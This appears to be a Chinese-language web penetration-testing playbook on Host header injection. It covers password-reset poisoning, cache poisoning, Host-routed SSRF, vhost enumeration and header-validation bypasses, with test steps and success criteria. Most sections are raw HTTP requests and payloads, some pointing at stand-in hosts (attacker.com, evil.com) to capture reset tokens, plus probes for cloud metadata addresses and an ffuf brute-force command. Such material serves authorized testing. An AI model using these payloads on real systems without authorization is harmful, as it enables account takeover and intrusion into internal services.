---

phase: webapp
vuln_class: [host-header]
title: Host 头注入与密码重置毒化
summary: Host/XFH 头注入：密码重置毒化、缓存投毒、路由绕过。
---

> 短表「Host 毒重置信」在 §2 下，用标题搜即可。有重置/激活口就打 Host / XFH（`dig-scope` §4.2.2），不必先看见邮件长什么样。没这类口，不要拿随机页空改 Host 来勾表。

# Host 头注入与路由滥用

## 0. 判据速查

| 现象 | 落点 | 判据 |
|---|---|---|
| 有重置/激活/邀请发信口 | 密码重置毒化 | 邮件里的链接是否用请求 Host 拼接 |
| 响应体/重定向里回显 Host | 反射型利用 | 回显位置决定危害（链接、跳转、脚本地址） |
| 缓存键不含 Host，但正文含 Host | 缓存投毒 | 换 Host 请求后，第二个请求拿到第一份响应 |
| 反代按 Host 选后端 | SSRF / vhost 绕过 | `Host: internal-xxx` 拿到内网面板 |
| Host 被 400/403 拦 | 换头绕过 | `X-Forwarded-Host` / `X-Host` / `Forwarded` |
| 校验只认首请求 | 连接状态攻击 | keep-alive 同连接第二请求换 Host |

---

## 1. 攻击面

Host 头被用于这些地方，每一处对应一种利用：

| 用途 | 利用 |
|---|---|
| 生成 URL（重置链接、邮件链接） | 注入攻击者域 → 用户点进攻击者站 |
| 虚拟主机路由 | 伪造 Host → 访问内部/管理 vhost |
| 缓存键组成 | 换 Host → 毒化所有用户的缓存 |
| 反向代理路由 | Host 决定后端 → SSRF 打内网 |
| 访问控制判断 | 基于 Host 的 ACL 可被绕过 |
| 规范 URL / SEO 跳转 | Host 注入 → 开放重定向 |

---

## 2. 密码重置毒化

### 2.1 Host 毒重置信（短表有指针）

**认**：清单有重置 / 激活 / 邀请发信口（`dig-scope` §4.2.2）。不必先看见邮件里是不是用 Host 拼的。

**打**：

1. 对自己的号走一遍重置，看信里链接用的是不是请求里的 Host。
2. 再打一次，把 `Host` 改成协作域名。被 400/403 拦了，**Host 保持原站**，只加 `X-Forwarded-Host: 协作域`（很多框架只验 Host、拼链却吃 XFH）。
3. 还可试 `Host: 原站.协作域`、`Host: 原站:@协作域`、请求行绝对 URI。

**算成**：协作域收到带 token 的重置/激活链，拿到 token 能在**原站**换别人的密。只反射 Host、邮件不跟 → 没成。

**假点**：信里仍是原站；token 绑死本机会话点不开；只改了展示域名、点开还要原站验证码。单站没中不删短表这行。有重置口仍打 Host/XFH，不必先看到信。没这类口才不用拿随机页改 Host。

**OAuth 变体**：未登录授权地址口（`GetAuthorizationUrl` 一类）回包用 Host 拼 `redirect_uri`。改 Host 后打开官方身份页，仍 200 且 URL 里回调是外域 → 算成（登完码落到外域）。身份页拒外域 → 假点。XFH 本站无效也试。

### 2.2 原理

```text
1. 攻击者给 victim@target.com 请求重置
2. 请求里把 Host 改成攻击者域：
   POST /forgot-password HTTP/1.1
   Host: attacker.com
   email=victim@target.com
3. 服务端用 Host 拼链接：
   "点击重置：https://attacker.com/reset?token=SECRET"
4. 受害者点开 → token 送到攻击者服务器
5. 攻击者拿 token 回真站改密
```

**测试**：把 Host 换成 Burp Collaborator 域，发重置请求，看协作端是否收到带 token 的 HTTP 请求。

**拼接变体**：

- `Host: target.com.attacker.com` → 链接变成 `https://target.com.attacker.com/reset?token=xxx`
- `Host: target.com:@attacker.com` → 部分 URL 解析器取 `attacker.com`

---

## 3. 经 Host 的缓存投毒

**前提**：缓存键只含路径不含 Host，而响应正文里用 Host 拼链接/脚本地址。

```text
GET / HTTP/1.1
Host: attacker.com
→ 响应被缓存，里面所有链接都指向 attacker.com
→ 后续用户请求 GET / 拿到这份毒化响应
```

**验证**：先发一个 `Host: attacker.com` 的请求，再发正常 Host 的请求，看第二份响应里是不是带着第一份的 Host。

**注意**：多数 CDN 把 Host 计入缓存键；自建 Varnish/Nginx 缓存可能没有。也可以拿 `X-Forwarded-Host` 当缓存键差异点去试。

---

## 4. 经 Host 路由的 SSRF

反向代理用 Host 选后端时：

```text
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local
→ 代理转发到 internal-admin-panel.local
```

常见于：Nginx 按 `$host` 做 `proxy_pass`、Apache 的 `ProxyPass` 虚拟主机路由、Kubernetes Ingress、云负载均衡。

**探测值**：`127.0.0.1`、`localhost`、`169.254.169.254`（云元数据）、`internal`、`intranet`。

---

## 5. 虚拟主机绕过

同一 IP 上挂多个应用时，换 Host 可能进到不在公网 DNS 里的站点：

```text
Host: www.target.com   → 公开站点
Host: admin.target.com → 管理后台（DNS 里没有）
Host: staging.target.com → 预发环境
Host: localhost        → 服务器状态页
```

**枚举**：

```bash
ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt
```

比对响应长度/标题，长度明显不同的就是另一个 vhost。

---

## 6. Host 被校验时的绕过

### 6.1 覆盖头

框架/代理可能优先信这些头：

| 头 | 信任它的组件 |
|---|---|
| `X-Forwarded-Host` | Symfony、Laravel、Django（`USE_X_FORWARDED_HOST=True`）、Rails（在代理后） |
| `X-Host` | 部分自定义代理 |
| `X-Original-URL` / `X-Rewrite-URL` | IIS + URL Rewrite |
| `Forwarded: host=attacker.com` | 符合 RFC 7239 的代理 |
| `X-Forwarded-Server` | Apache mod_proxy |

一次全带上试：

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

**这是最常被漏掉的一条**：校验只查 `Host`，但框架在代理后静默优先用 `X-Forwarded-Host`。

### 6.2 请求行绝对 URI

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

RFC 7230 说请求行含绝对 URI 时应忽略 Host。有的服务器照做、有的不照做——代理与后端的这种分歧本身就是漏洞。

### 6.3 双 Host 头

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

行为不定：代理校验第一个、应用用第二个；或拼成 `target.com, attacker.com`；RFC 要求 400，但几乎没人实现。

### 6.4 带端口 / 带凭据

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

含 `@`（凭据）或 `#`（片段）时，不同 URL 解析器提取出的「host 部分」不一样。

### 6.5 尾点

```http
Host: target.com.
```

DNS 认为 `target.com.` 与 `target.com` 等价（尾点表示 FQDN），但字符串校验往往不剥尾点 → 白名单绕过。

### 6.6 空白注入

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

部分解析器按空白切分：校验看前段，使用取后段。

### 6.7 包裹值

```http
Host: "attacker.com"
Host: <attacker.com>
```

应用可能剥掉引号/尖括号，校验器不剥。

---

## 7. 框架行为对照

| 框架 | Host 来源 | 坑 |
|---|---|---|
| PHP | `$_SERVER['HTTP_HOST']`（原始头，直接可控） | `SERVER_NAME` 仅在 `UseCanonicalName On` 时更安全 |
| Django | `HttpRequest.get_host()` 先看 `X-Forwarded-Host`（若开启） | `USE_X_FORWARDED_HOST=True` 会绕过 `ALLOWED_HOSTS` |
| Rails | `request.host` 取自 Host 头；代理后信任 `X-Forwarded-Host` | Rails 6+ 的 `HostAuthorization` 中间件可缓解 |
| Node/Express | `req.hostname` / `req.headers.host`；`trust proxy` 时用 XFH | 无内建 Host 校验 |

---

## 8. 连接状态攻击

利用 keep-alive 的变体：代理只在**首请求**做 Host 校验。

```text
请求 1：GET /        Host: target.com   → 校验通过、转发、保持连接
请求 2：GET /admin   Host: evil.com     → 同连接，跳过校验
```

**测试**：Burp Repeater 里带 `Connection: keep-alive`，先发正常请求，再在同一连接上发篡改 Host 的请求，看是否被区别处理。自动化扫描器基本不测这条。

---

## 9. 决策树

```text
应用是否在响应/行为里用 Host？
├── 直接注入 Host
│   ├── 改成攻击者域 → 响应里回显？
│   │   ├── 是 → 看落点：
│   │   │   ├── 重置邮件 → 密码重置毒化
│   │   │   ├── 缓存响应 → 缓存投毒
│   │   │   ├── 跳转 Location → 开放重定向
│   │   │   └── 脚本/链接地址 → 经 Host 的 XSS
│   │   └── 否（400/403/异常）→ Host 有校验，走 §6 绕过
│   └── 绕过清单：XFH / X-Host / Forwarded / 绝对 URI / 双 Host /
│       带凭据 / 尾点 / 空白 / 连接状态
├── vhost 枚举：ffuf 打 IP，比对响应长度
├── Host 路由 SSRF：127.0.0.1 / internal-xxx / 169.254.169.254
└── 都没反应 → 看服务端操作（发信、webhook、API 回调）是否用 Host
```

---

## 10. 容易漏的点

1. **重置毒化不需要受害者登录**——你发起、他点链接，token 落到你服务器。
2. **`X-Forwarded-Host` 是第一号漏点**：校验查 `Host`，框架在代理后优先用 XFH。
3. **双 Host 头协议合法但行为未定义**：RFC 要求 400，实际几乎没人做；代理与后端分歧即漏洞。
4. **绝对 URI 按 RFC 应覆盖 Host**：`GET http://evil.com/path` + `Host: target.com`，实现分歧。
5. **缓存投毒要求缓存键排除 Host**：多数 CDN 含 Host，自建缓存可能不含；也试 XFH 做键差异。
6. **连接状态攻击很少被测**：扫描器不测 keep-alive，必须手工在 Repeater 里复用连接。
7. **DNS rebinding 配合 Host**：自己控 DNS 时把域名指到目标 IP，Host 是自己的域但请求打到对方服务器，可绕基于 IP 的访问控制。
